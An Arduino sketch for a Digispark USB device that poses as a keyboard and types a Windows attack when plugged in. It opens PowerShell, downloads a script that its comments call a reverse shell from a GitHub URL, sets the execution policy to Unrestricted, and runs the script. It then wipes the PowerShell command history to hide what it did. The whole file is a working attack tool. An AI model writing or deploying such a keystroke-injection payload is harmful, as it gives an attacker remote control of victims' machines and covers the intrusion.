//Converted at 2022-05-02 22:46:53.876381
#include "keymap.h"
#include "DigiKeyboard.h"

void setup() {
  // initialize the digital pin as an output.
  pinMode(0, OUTPUT); //LED on Model B
  pinMode(1, OUTPUT); //LED on Model A
  digitalWrite(0, LOW);    // turn the LED off by making the voltage LOW
  digitalWrite(1, LOW);
  // don't need to set anything up to use DigiKeyboard
}

void loop(){

  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke('r', KEY_LEFT_GUI);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("Run");
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("PowerShell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT);
  DigiKeyboard.delay(500);
  //Open a powershell client and download remote reverse shell script
  DigiKeyboard.print("$client = New-Object System.Net.WebClient");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("$client.DownloadFile('https://raw.githubusercontent.com/XALM1337X/Quick-Reverse-Powershell-Rubber-Ducky/master/rs.ps1', 'C:\\rs.ps1')");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  DigiKeyboard.print("Set-ExecutionPolicy -ExecutionPolicy Unrestricted");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
 
  DigiKeyboard.sendKeyStroke(KEY_A);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  
  DigiKeyboard.print("powershell C:\\rs.ps1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);    
  //TODO: Schedule task using to run reverse shell script
  
  //Testing
  
  
  //Delete all powershell command line history in current session and delete session.
  DigiKeyboard.print("[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("Clear-History");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("Remove-Item (Get-PSReadlineOption).HistorySavePath");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  //Exit Terminal
  //DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  


  //Clear history in shell
  //[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
  //&&
  //Clear-History
  
  
  //DigiKeyboard.delay(600);
  //DigiKeyboard.sendKeyStroke(KEY_LEFTARROW, KEY_ENTER);

  //END:  Parsed by rubberDigi Script

  DigiKeyboard.delay(100);
  while(1){
  }
}
